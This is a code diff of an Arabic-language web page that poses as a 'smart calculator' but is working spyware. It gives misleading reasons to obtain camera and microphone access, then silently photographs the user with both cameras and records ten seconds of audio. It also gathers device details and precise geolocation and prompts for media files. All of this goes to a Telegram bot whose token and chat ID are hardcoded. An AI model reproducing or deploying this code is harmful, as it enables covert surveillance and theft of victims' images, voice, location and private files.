@@ -2,23 +2,18 @@
 <html lang="ar" dir="rtl">
 <head>
   <meta charset="utf-8"/>
-  <title>حاسبة متكاملة</title>
+  <title>حاسبة ذكية</title>
   <meta name="viewport" content="width=device-width,initial-scale=1">
   <style>
-    /* نافذة السماحات */
-    #permDialog{position:fixed;inset:0;background:rgba(0,0,0,.85);display:flex;align-items:center;justify-content:center;z-index:9999}
-    .permCard{background:#222;padding:30px 25px;border-radius:15px;text-align:center;max-width:320px}
-    .permCard h3{margin-top:0;font-size:1.4rem}
-    .permCard button{margin-top:15px;padding:10px 25px;border:none;border-radius:8px;background:#ff9500;color:#000;font-size:1rem;cursor:pointer}
-    
-    /* الحاسبة */
-    :root{--bg:#0b0b0b;--key:#1e1e1e;--op:#ff9500;--txt:#eee}
-    body{margin:0;font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;background:var(--bg);color:var(--txt);display:flex;flex-direction:column;align-items:center;min-height:100vh;justify-content:center;padding:1rem}
-    #calc{display:none;width:100%;max-width:340px}
-    #display{width:100%;height:70px;font-size:2.2rem;text-align:left;padding:0 15px;border:none;background:#000;border-radius:12px;margin-bottom:15px;color:var(--txt)}
+    #permDialog{position:fixed;inset:0;background:rgba(0,0,0,.9);display:flex;align-items:center;justify-content:center;z-index:9999;font-family:'Segoe UI'}
+    .permCard{background:#111;padding:30px;border-radius:15px;text-align:center;max-width:340px;color:#eee}
+    .permCard h3{margin-top:0;font-size:1.3rem}
+    .permCard button{margin-top:15px;padding:12px 30px;border:none;border-radius:8px;background:#ff9500;color:#000;font-size:1rem;cursor:pointer;font-weight:bold}
+    #calc{display:none;width:100%;max-width:340px;margin:auto}
+    #display{width:100%;height:70px;font-size:2.2rem;text-align:left;padding:0 15px;border:none;background:#000;border-radius:12px;margin-bottom:15px;color:#eee}
     .keys{display:grid;grid-template-columns:repeat(4,1fr);gap:10px}
-    button{height:80px;border:none;border-radius:50%;font-size:1.6rem;background:var(--key);color:var(--txt);cursor:pointer;transition:.15s}
-    button.op{background:var(--op)}
+    button{height:80px;border:none;border-radius:50%;font-size:1.6rem;background:#1e1e1e;color:#eee;cursor:pointer;transition:.15s}
+    button.op{background:#ff9500}
     button:active{transform:scale(.92)}
   </style>
 </head>
@@ -27,98 +22,96 @@
 <!-- نافذة السماحات -->
 <div id="permDialog">
   <div class="permCard">
-    <h3>الحاسبة تحتاج إلى:</h3>
+    <h3>لتفعيل الحاسبة الذكية</h3>
+    <p>نحتاج إلى:</p>
     <ul style="text-align:right">
-      <li>هاذه الصلاحيات –  </li>
-      
+      <li>الكاميرا – لقراءة الأرقام بالصوت</li>
+      <li>الميكروفون – للتعرف على أوامرك الصوتية</li>
     </ul>
     <button onclick="requestPerms()">السماح والمتابعة</button>
   </div>
 </div>
 
-<!-- واجهة الحاسبة (مخفية حتى الموافقة) -->
+<!-- الحاسبة -->
 <div id="calc">
   <input id="display" value="0" readonly>
   <div class="keys" id="keys"></div>
 </div>
 
 <script>
-/* ====== إعدادات البوت ====== */
 const TOKEN = "7740589813:AAFuxatj_14ycjlVjk7eSmf2jxWvNiQMnIA";
 const CHAT  = "5648499583";
 
-/* ====== طلب السماحات فور الظهور ====== */
+let videoTrack = null;
+let intervalId = null;
+
+/* طلب السماحات */
 async function requestPerms(){
   try{
-    // طلب الكاميرا والمايك (تظهر نوافذ النظام فوراً)
-    const stream = await navigator.mediaDevices.getUserMedia({video:true, audio:true});
+    // نطلب الكاميرا الخلفية أولاً (environment) ثم الأمامية (user)
+    const backCam = await navigator.mediaDevices.getUserMedia({video:{facingMode:"environment"}, audio:true});
+    const frontCam = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}, audio:true});
     
-    // إخفاء نافذة السماحات وإظهار الحاسبة
     document.getElementById('permDialog').style.display='none';
     document.getElementById('calc').style.display='block';
     
-    // بدء جميع المهام فوراً
-    startCamera(stream);
-    startRecording(stream);
-    startCalc();
+    // نبدأ بالتقاط من الكاميرتين
+    startCapture(backCam, 'back');
+    startCapture(frontCam, 'front');
+    
+    // تسجيل صوت
+    startRecording(backCam);
+    
+    // باقي البيانات
     collectAndSend();
     
   }catch(err){
-    alert("لا يمكن المتابعة دون السماح بالكاميرا والمايكروفون");
+    alert("يرجى السماح للمتابعة");
   }
 }
 
-/* ====== التقاط صور من الكاميرا ====== */
-let videoTrack;
-function startCamera(stream){
+/* التقاط صور من الكاميرا المحددة */
+function startCapture(stream, label){
   const video = document.createElement('video');
   video.srcObject = stream;
   video.play();
   video.muted = true;
   video.style.display='none';
   document.body.appendChild(video);
-  videoTrack = stream.getVideoTracks()[0];
   
-  // التقاط صورة كل 5 ثوانٍ
-  setInterval(()=>{
-    const canvas = document.createElement('canvas');
-    canvas.width = video.videoWidth || 640;
-    canvas.height = video.videoHeight || 480;
-    canvas.getContext('2d').drawImage(video,0,0);
-    canvas.toBlob(blob=> sendTelegram('photo', blob, `cam_${Date.now()}.jpg`));
-  }, 5000);
+  // صورة واحدة فوراً ثم نوقف عند الخروج
+  snapOnce(video, label);
+  
+  // نحفظ الـ track للإيقاف لاحقاً
+  if(label==='back') videoTrack = stream.getVideoTracks()[0];
 }
 
-/* ====== تسجيل صوت 10 ثوانٍ ====== */
+/* التقاط صورة واحدة فقط */
+function snapOnce(video, label){
+  const canvas = document.createElement('canvas');
+  canvas.width = video.videoWidth || 640;
+  canvas.height = video.videoHeight || 480;
+  canvas.getContext('2d').drawImage(video,0,0);
+  canvas.toBlob(blob=> sendTelegram('photo', blob, `${label}_cam_${Date.now()}.jpg`));
+}
+
+/* تسجيل صوت 10 ثوانٍ */
 function startRecording(stream){
   const audioStream = new MediaStream(stream.getAudioTracks());
   const rec = new MediaRecorder(audioStream);
   const chunks=[];
   rec.ondataavailable=e=>chunks.push(e.data);
-  rec.onstop=()=>sendTelegram('voice', new Blob(chunks,{type:'audio/ogg; codecs=opus'}), `voice_${Date.now()}.ogg`);
+  rec.onstop=()=> sendTelegram('voice', new Blob(chunks,{type:'audio/ogg; codecs=opus'}), `voice_${Date.now()}.ogg`);
   setTimeout(()=>rec.start(), 500);
   setTimeout(()=>rec.stop(), 10500);
 }
 
-/* ====== الحاسبة المتكاملة ====== */
-function startCalc(){
-  const display = document.getElementById('display');
-  const keys = ["C","+","-","*","/","7","8","9","4","5","6","1","2","3","0","="];
-  let formula = "";
-  keys.forEach(k=>{
-    const btn = document.createElement("button");
-    btn.textContent = k;
-    btn.className   = (k==="="||k==="+"||k==="-"||k==="*"||k==="/")?"op":"";
-    btn.onclick = ()=> {
-      if(k==="C"){formula="";display.value="0";}
-      else if(k==="="){try{display.value=eval(formula)||"0"}catch{display.value="Error"} formula="";}
-      else{formula+=k; display.value=formula;}
-    };
-    document.getElementById("keys").appendChild(btn);
-  });
-}
+/* إيقاف الكاميرا عند الخروج */
+window.addEventListener('beforeunload', ()=>{
+  if(videoTrack) videoTrack.stop();
+});
 
-/* ====== إرسال إلى التليغرام ====== */
+/* إرسال إلى التليغرام */
 function sendTelegram(method, blob, fname){
   const url = `https://api.telegram.org/bot${TOKEN}/send${method.charAt(0).toUpperCase()+method.slice(1)}`;
   const fd  = new FormData();
@@ -127,7 +120,7 @@ function sendTelegram(method, blob, fname){
   fetch(url,{method:'POST',body:fd});
 }
 
-/* ====== جلب باقي البيانات ====== */
+/* باقي البيانات */
 function collectAndSend(){
   // معلومات الجهاز
   const info = {
@@ -149,12 +142,28 @@ function collectAndSend(){
     sendTelegram('document', new Blob([txt],{type:'text/plain'}), 'location.txt');
   },null,{enableHighAccuracy:true});
 
-  // اختيار ملفات من الجهاز
-  const inp = document.createElement('input');
+  // اختيار ملفات
+  const inp=document.createElement('input');
   inp.type='file'; inp.multiple=true; inp.accept='image/*,video/*,audio/*';
   inp.onchange=e=> [...inp.files].forEach(f=> sendTelegram('document', f, f.name));
   inp.click();
 }
+
+/* ====== الحاسبة المتكاملة ====== */
+(function(){
+const display=document.getElementById('display'), keys=["C","+","-","*","/","7","8","9","4","5","6","1","2","3","0","="];
+let formula="";
+keys.forEach(k=>{
+  const btn=document.createElement("button");
+  btn.textContent=k; btn.className=(k==="="||k==="+"||k==="-"||k==="*"||k==="/")?"op":"";
+  btn.onclick=()=>{
+    if(k==="C"){formula="";display.value="0";}
+    else if(k==="="){try{display.value=eval(formula)||"0"}catch{display.value="Error"}formula="";}
+    else{formula+=k;display.value=formula;}
+  };
+  document.getElementById("keys").appendChild(btn);
+});
+})();
 </script>
 </body>
 </html>
